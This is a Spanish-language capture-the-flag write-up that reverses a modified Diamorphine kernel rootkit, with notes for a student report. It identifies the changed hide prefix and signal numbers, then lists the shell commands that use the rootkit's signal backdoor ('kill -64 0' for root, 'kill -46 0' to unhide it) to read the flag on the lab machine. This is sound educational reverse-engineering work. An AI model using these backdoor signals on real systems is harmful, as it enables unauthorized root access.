# Recap — Reto Cyberpsychosis (Reversing)

Diamorphine (rootkit LKM) modificado. El reto es **reversear** el módulo para
descubrir qué cambiaron, y luego usar ese conocimiento en la **máquina remota**
para volverse root y leer la flag (la flag NO está dentro del `.ko`).

Hallazgos del binario:
- MAGIC_PREFIX cambiado de `diamorphine_secret` → **`psychosis`** (oculta archivos/carpetas con ese prefijo).
- Señal de ocultar/mostrar el módulo cambiada de **63 → 46** (`cmp eax,0x2e` en `hacked_kill`).
- Señal de root: **64** (`give_root`, sin cambios). Señal de ocultar proceso: 31 (sin cambios).

---

## Pasos

**Paso 1 — Reconocimiento (estático)**
Identificar que es un módulo de kernel y qué rootkit es.
```bash
file diamorphine.ko          # ELF relocatable, kernel module, not stripped, debug_info
modinfo diamorphine.ko       # author=m0nad, description=LKM rootkit, vermagic 5.15.0-82-generic
```

**Paso 2 — Análisis / identificación de lo modificado (Ghidra)**
Abrir `diamorphine.ko` en Ghidra (Import → Analyze), ir a la función `hacked_kill`
y leer el decompilador:
- `if (sig == 0x2e)` (46) → oculta/muestra el módulo  ← la señal MODIFICADA.
- `if (sig == 0x40)` (64) → `prepare_creds` + uid/gid=0 + `commit_creds` = give_root.
- `if (sig == 0x1f)` (31) → oculta/muestra un proceso.
En *Window → Defined Strings* se ve el prefijo `psychosis`.

(Equivalente en terminal: `objdump -d -M intel --disassemble=hacked_kill diamorphine.ko`
o en radare2 `pdf @ sym.hacked_kill`.)

**Paso 3 — Explotación (máquina remota)**
Start Challenge → da un target (IP y puerto). Conectarse y usar las señales
reverseadas para volverse root, desocultar/quitar el módulo y leer la flag:
```bash
nc -nv <IP> <PUERTO>
# ya dentro del shell:
id                    # usuario normal
kill -64 0            # give_root (señal 64)
id                    # ahora uid=0(root)
kill -46 0            # desoculta el módulo (señal modificada 46)
rmmod diamorphine     # lo descarga -> deja de ocultar archivos
find / -iname "*flag*" 2>/dev/null     # o:  find / -iname "psychosis*" 2>/dev/null
cat <ruta>/flag.txt
```

---

## Capturas a tomar (guardar en `segu_p2/imagenes/`)

| Imagen | Paso | Qué capturar |
|---|---|---|
| `cyber_modinfo.png` | 1 | salida de `file diamorphine.ko` + `modinfo diamorphine.ko` (se ve `author=m0nad`, `LKM rootkit`, `vermagic 5.15.0-82-generic`) |
| `cyber_hacked_kill.png` | 2 | el panel **Decompile** de Ghidra de `hacked_kill` con `sig == 0x2e` (46) y la rama `== 0x40` (give_root) visibles |
| `cyber_psychosis.png` | 2 | el prefijo `psychosis` (Ghidra *Defined Strings*, o `strings diamorphine.ko \| grep psychosis`) — opcional pero suma |
| `cyber_flag.png` | 3 | la sesión `nc`: `id` (normal) → `kill -64 0` → `id` (root) → `kill -46 0` → `rmmod` → `find` → `cat` con el `HTB{...}` |

## Datos para `documentacion.md` (sección 1.5)
- Categoría: Reversing · Dificultad: Very Easy · Puntos: (confirmar en HTB) · Resuelto por: Sebastian Donoso.
- CWE: **CWE-506 (Embedded Malicious Code)** — es un rootkit; se apoya en CWE-250/CWE-269 (manejo indebido de privilegios al dar root por señal).
- CAPEC: **CAPEC-550 (Install Rootkit)** / relacionado CAPEC-556 (Replace File Extension… no aplica) — mejor CAPEC-550.
- Bandera: la que salga del `cat` en el Paso 3.
